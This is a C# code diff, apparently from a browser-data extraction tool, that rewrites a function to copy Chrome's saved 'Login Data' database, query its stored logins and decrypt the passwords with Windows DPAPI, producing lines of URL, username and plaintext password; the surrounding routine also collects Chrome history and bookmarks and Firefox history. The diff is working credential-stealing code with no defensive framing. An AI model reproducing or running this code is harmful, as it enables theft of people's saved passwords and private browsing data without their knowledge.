@@ -6,6 +6,7 @@ using System.Collections.Generic;
 using System.Linq;
 using Microsoft.Win32;
 using System.Security.Cryptography;
+using System.Data.SQLite;
 
 namespace TP
 {
@@ -19,7 +20,7 @@ namespace TP
 
         protected override string ExtractData()
         {
-            Tuple<List<string>, List<string>> chromeUserPassword = GetChromeUserPassword();
+            List<string> chromeUserPassword = GetChromeUserPassword();
             List<string> chromeHistory = GetChromeHistory();
             List<string> chromeBookmarks = GetChromeBookmarks();
             List<string> firefoxHistory = GetFirefoxHistory();
@@ -101,20 +102,34 @@ namespace TP
             return jsons;
         }
 
-        protected Tuple<List<string>, List<string>> GetChromeUserPassword()
+        protected List<string> GetChromeUserPassword()
         {
-            var pathWithEnv = @"%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Profile 1\Login Data";
-            Encoding encoding = Encoding.GetEncoding(28591);
-
-            string binaryText = ReadFilePath(pathWithEnv, encoding);
-
-            if (binaryText == null)
+            var pathWithEnv = @"%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Login Data";
+            var filePath = Environment.ExpandEnvironmentVariables(pathWithEnv);
+            if (filePath == null)
                 return null;
 
-            List<string> decPwdArray = ExtractPassword(encoding, binaryText);
-            List<string> usr = ExtractUser(encoding, binaryText);
+            string tempFileName = Path.GetTempPath() + Path.GetRandomFileName();
+            File.Copy(filePath, tempFileName);
 
-            return new Tuple<List<string>, List<string>>(usr, decPwdArray);
+            string ds = @"Data Source=" + tempFileName;
+            SQLiteConnection conn = new SQLiteConnection(ds);
+            conn.Open();
+            string q = "SELECT action_url, username_value, password_value FROM logins";
+            SQLiteCommand cmd = new SQLiteCommand(q, conn);
+            SQLiteDataReader dr = cmd.ExecuteReader();
+            List<string> pwds = new List<string>();
+
+            while (dr.Read())
+            {
+                var decrypt = ProtectedData.Unprotect((byte[])dr["password_value"], null, DataProtectionScope.CurrentUser);
+                var pwd = Encoding.ASCII.GetString(decrypt);
+                string userPwdRow = "URL: " + dr["action_url"] + " " + "Username: " + dr["username_value"] + " " + "Password: " + pwd;
+                pwds.Add(userPwdRow);
+            }
+
+            return pwds;
+            
         }
 
         protected List<string> GetFirefoxHistory()
@@ -141,7 +156,7 @@ namespace TP
             return history;
         }
 
-        protected List<string> ExtractUser(Encoding encoding, string binaryText)
+        /*protected List<string> ExtractUser(Encoding encoding, string binaryText)
         {
             string pattern = @"(ht|f)tp(s?)\:\/\/[0-9a-zA-Z]([-.\w]*[0-9a-zA-Z])*(\/?)";
             Regex userRegex = new Regex(pattern);
@@ -174,7 +189,7 @@ namespace TP
             }
 
             return decPwdArray;
-        }
+        }*/
 
         protected string ReadFilePath(string pathWithEnv, Encoding encoding)
         {
